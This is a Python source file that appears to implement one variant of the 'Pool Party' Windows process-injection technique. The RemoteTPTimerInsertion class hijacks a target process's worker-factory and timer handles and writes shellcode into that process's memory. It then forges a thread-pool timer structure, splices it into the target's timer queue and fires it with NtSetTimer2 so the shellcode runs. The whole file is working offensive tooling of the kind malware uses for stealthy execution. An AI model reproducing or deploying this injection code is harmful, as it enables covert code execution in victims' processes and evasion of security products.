import ctypes

from pool_party import *
from write_shellcode import *


class RemoteTPTimerInsertion(PoolParty):
    def __init__(self, process):
        super().__init__(process)
        self.process_handle = HANDLE(0)
        self.worker_factory_handle = HANDLE(0)
        self.timer_handle = HANDLE(0)
        self.shellcode_address = 0

    def hijack(self):
        self.worker_factory_handle = self.hijack_process_handle(TP_WORKER_FACTORY_OBJECT_NAME,
                                                                WORKER_FACTORY_ALL_ACCESS)
        self.timer_handle = self.hijack_process_handle(TIMER_OBJECT_NAME, TIMER_ALL_ACCESS)
        return True

    def write_shellcode_to_pool(self):
        self.shellcode_address = write_shellcode(self.process_handle)
        return True

    def setup_execute(self):
        worker_factory_information = (ctypes.c_ubyte * SIZE_OF_WORKER_FACTORY_BASIC_INFORMATION_STRUCT)()
        nt_status = NtQueryInformationWorkerFactory(self.worker_factory_handle, WorkerFactoryBasicInformation,
                                                    POINTER(ctypes.c_ubyte)(worker_factory_information),
                                                    SIZE_OF_WORKER_FACTORY_BASIC_INFORMATION_STRUCT, None)
        if nt_status != 0:
            logging.error("[-] NtQueryInformationWorkerFactory failed with NTSTATUS 0x{:x}".format(nt_status))
            return False

        tp_timer_ptr = CreateThreadpoolTimer(self.shellcode_address, None, None)
        if tp_timer_ptr is None:
            logging.error("[-] CreateThreadpoolTimer Failed with Error Code %d" % GetLastError())
            return False

        remote_tp_timer_address = VirtualAllocEx(self.process_handle, None, SIZE_OF_FULL_TP_TIMER_STRUCT, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if remote_tp_timer_address is None:
            logging.error("[-] VirtualAllocEx for Full TP Timer Failed with Error Code %d" % GetLastError())
            return False

        timeout = -10000000
        x1 = tp_timer_ptr
        start_parameter = convert_buffer_to_struct(worker_factory_information, LPVOID, 0x50)
        cleanup_group_member_pool = convert_buffer_to_struct(tp_timer_ptr, c_uint64, 0x90)
        cleanup_group_member_pool.value = start_parameter.value

        due_time = convert_buffer_to_struct(tp_timer_ptr, c_int64, 0x148)
        due_time.value = timeout

        windows_start_links_key = convert_buffer_to_struct(tp_timer_ptr, c_int64, 0x140)
        windows_start_links_key.value = timeout

        windows_end_links_key = convert_buffer_to_struct(tp_timer_ptr, c_int64, 0x118)
        windows_end_links_key.value = timeout

        windows_start_links_key_children_flink = convert_buffer_to_struct(tp_timer_ptr, c_uint64, 0x130)
        windows_start_links_key_children_flink.value = remote_tp_timer_address + 0x130

        windows_start_links_key_children_blink = convert_buffer_to_struct(tp_timer_ptr, c_uint64, 0x138)
        windows_start_links_key_children_blink.value = remote_tp_timer_address + 0x130

        windows_end_links_key_children_flink = convert_buffer_to_struct(tp_timer_ptr, c_uint64, 0x108)
        windows_end_links_key_children_flink.value = remote_tp_timer_address + 0x108

        windows_end_links_key_children_blink= convert_buffer_to_struct(tp_timer_ptr, c_uint64, 0x110)
        windows_end_links_key_children_blink.value = remote_tp_timer_address + 0x108

        if not WriteProcessMemory(self.process_handle, remote_tp_timer_address, tp_timer_ptr, SIZE_OF_FULL_TP_TIMER_STRUCT, None):
            logging.error("[-] WriteProcessMemory Remote TP Timer Failed with Error Code %d" % GetLastError())
            return False

        pool_address = convert_buffer_to_struct(tp_timer_ptr, c_uint64, 0x90)
        root_start_address_from_pool = pool_address.value + 0x80

        tp_timer_window_start_links = remote_tp_timer_address + 0x120
        c_number = c_void_p(tp_timer_window_start_links)
        if not WriteProcessMemory(self.process_handle, root_start_address_from_pool, cast(byref(c_number), LPVOID), 8, None):
            logging.error("[-] WriteProcessMemory tp_timer_window_start_links Failed with Error Code %d" % GetLastError())
            return False

        root_end_address_from_pool = pool_address.value + 0x88
        tp_timer_window_end_links = remote_tp_timer_address + 0xf8
        c_number = c_void_p(tp_timer_window_end_links)
        if not WriteProcessMemory(self.process_handle, root_end_address_from_pool, cast(byref(c_number), LPVOID), 8, None):
            logging.error("[-] WriteProcessMemory tp_timer_window_end_links Failed with Error Code %d" % GetLastError())
            return False

        time = c_int(timeout)
        nt_status = NtSetTimer2(self.timer_handle, byref(time), 0, None)
        if nt_status != 0:
            logging.error("[-] SetTimer2 Failed with NTSTATUS {:x}".format(nt_status))
            return False

        logging.info("[+] Executing shellcode....")